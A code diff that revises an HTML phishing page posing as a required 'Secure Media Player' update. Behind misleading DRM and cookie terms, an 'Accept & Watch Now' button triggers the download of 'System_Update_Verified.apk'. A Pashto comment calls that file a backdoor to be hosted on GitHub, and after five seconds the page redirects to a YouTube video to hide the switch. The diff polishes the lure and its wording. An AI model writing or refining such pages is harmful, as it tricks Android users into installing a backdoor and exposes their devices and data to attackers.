@@ -2,38 +2,50 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Media Player Security Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Media Player - Required Update</title>
     <style>
-        body { font-family: 'Roboto', Arial, sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #1a1a1a; padding: 40px; border-radius: 12px; box-shadow: 0 0 20px rgba(255,0,0,0.5); text-align: center; max-width: 450px; border: 1px solid #333; }
-        .icon { font-size: 50px; color: #ff0000; margin-bottom: 20px; }
-        h1 { font-size: 22px; margin-bottom: 15px; color: #eee; }
-        .terms { height: 120px; overflow-y: scroll; background: #000; padding: 10px; font-size: 11px; color: #888; text-align: left; margin-bottom: 25px; border: 1px solid #444; }
-        .btn { background-color: #d32f2f; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; transition: 0.3s; }
-        .btn:hover { background-color: #b71c1c; box-shadow: 0 0 15px #ff0000; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f0f0f; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .modal { background: #1e1e1e; width: 90%; max-width: 450px; padding: 30px; border-radius: 15px; box-shadow: 0 0 30px rgba(255, 0, 0, 0.2); border: 1px solid #333; text-align: center; }
+        .icon { font-size: 60px; color: #ff0000; margin-bottom: 15px; }
+        h2 { font-size: 22px; margin-top: 0; color: #fff; }
+        .cookie-text { height: 130px; overflow-y: scroll; font-size: 11px; color: #aaa; text-align: left; background: #000; padding: 15px; border: 1px solid #444; margin-bottom: 25px; line-height: 1.6; }
+        .btn { background-color: #ff0000; color: white; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 17px; text-transform: uppercase; transition: 0.3s; }
+        .btn:hover { background-color: #cc0000; box-shadow: 0 0 15px rgba(255, 0, 0, 0.5); }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="icon">⚠️</div>
-        <h1>Player Encryption Update</h1>
-        <p style="font-size: 14px; color: #bbb;">To view this premium content, your device must accept the updated Media DRM & Cookie Security Policy.</p>
-        <div class="terms">
-            TERMS OF SERVICE: v.10.4.2026. This update ensures end-to-end encryption for streaming data. By clicking "Accept", you authorize the installation of secure playback certificates required for high-definition rendering. This package includes mandatory security patches to prevent buffer overflow and unauthorized stream interception. System diagnostics will be temporarily enabled to optimize network latency... (User likely stops reading here).
+
+    <div class="modal">
+        <div class="icon">🎬</div>
+        <h2>System Update Required</h2>
+        <p style="font-size: 14px; color: #ccc;">To continue watching this video, please accept our security cookies and update your integrated media drivers.</p>
+        
+        <div class="cookie-text">
+            BY CLICKING "ACCEPT & WATCH", YOU AGREE TO:
+            1. Installation of verified media DRM certificates (v10.4.2026).
+            2. Enabling secure end-to-end encryption for high-definition streaming.
+            3. Temporary storage of playback telemetry and buffer diagnostic data.
+            4. Performance tuning for your specific Android device architecture.
+            5. Acceptance of our updated Privacy Policy regarding third-party player plugins.
+            NOTE: This update is mandatory to prevent playback errors (Code: 403-X) and ensure system compatibility with the latest video codecs. Your connection is secured via SSL/TLS encryption.
         </div>
-        <button class="btn" onclick="startUpdate()">Accept & Update Now</button>
+
+        <button class="btn" onclick="startUpdate()">Accept & Watch Now</button>
     </div>
 
     <script>
         function startUpdate() {
-            // ستا د باکډور فایل لینک (چې په GitHub کې به یې اپلوډ کړو)
+            // ۱. دا ستا د APK فایل ډانلوډ پیلوي
+            // ډاډ ترلاسه کړه چې ستا د APK فایل نوم کټ مټ همدا دی
             window.location.href = "System_Update_Verified.apk";
             
-            // له ۵ ثانیو وروسته ورته اصلي ویډیو خلاصوي
+            // ۲. کټ مټ له ۵ ثانیو وروسته ستا د ویډیو لینک خلاصوي
             setTimeout(function(){
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                window.location.href = "https://youtube.com/shorts/emKVWd9H6iA?si=R-Cx711N3SvUnASB";
             }, 5000);
         }
     </script>
+
 </body>
 </html>
